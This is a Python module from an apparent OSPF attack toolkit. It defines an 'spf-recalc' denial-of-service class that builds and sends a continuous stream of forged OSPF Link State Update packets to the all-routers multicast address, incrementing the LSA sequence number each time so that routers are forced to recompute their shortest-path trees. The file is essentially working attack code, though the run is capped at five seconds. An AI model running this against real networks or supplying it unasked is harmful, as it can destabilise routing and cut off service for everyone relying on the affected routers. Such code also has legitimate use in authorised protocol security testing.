import time
from ospf_attack.attacks.base import BaseAttack, AttackResult, AttackCategory
from ospf_attack.config.types import DoSConfig
from ospf_attack.core.packet import build_lsu_packet, build_lsa_header, OSPF_MULTICAST_ALL
from ospf_attack.network.sender import PacketSender


class SPFRecalcAttack(BaseAttack):
    name = "spf-recalc"
    description = "持续注入变化的 LSA 迫使路由器反复执行 SPF"
    category = AttackCategory.DOS
    config: DoSConfig

    def setup(self) -> None:
        self._sender = PacketSender(
            iface=self.config.iface, packet_rate=self.config.packet_rate, max_packets=0,
        )

    def launch(self) -> AttackResult:
        from ospf_attack.network.adapter import get_local_ip
        src_ip = get_local_ip(self.config.iface)
        seq = 0x80000001
        deadline = time.time() + min(self.config.duration, 5)
        while time.time() < deadline:
            lsa = build_lsa_header(
                lsa_type=1, link_state_id=self.config.router_id,
                advertising_router=self.config.router_id, sequence=seq, age=0,
            )
            pkt = build_lsu_packet(
                router_id=self.config.router_id, area_id=self.config.area_id,
                src_ip=src_ip, dst_ip=OSPF_MULTICAST_ALL, lsa_count=1,
            )
            pkt = pkt / lsa
            self._sender.send_raw(pkt)
            seq = (seq + 1) % 0x7FFFFFFF
            time.sleep(self.config.lsa_change_interval)
        return AttackResult(success=True, packets_sent=self._sender.sent_count,
                           target_affected=False,
                           details=f"SPF 重计算: {self._sender.sent_count} LSA injected")

    def verify(self) -> bool:
        return self._sender.sent_count > 5

    def teardown(self) -> None:
        pass
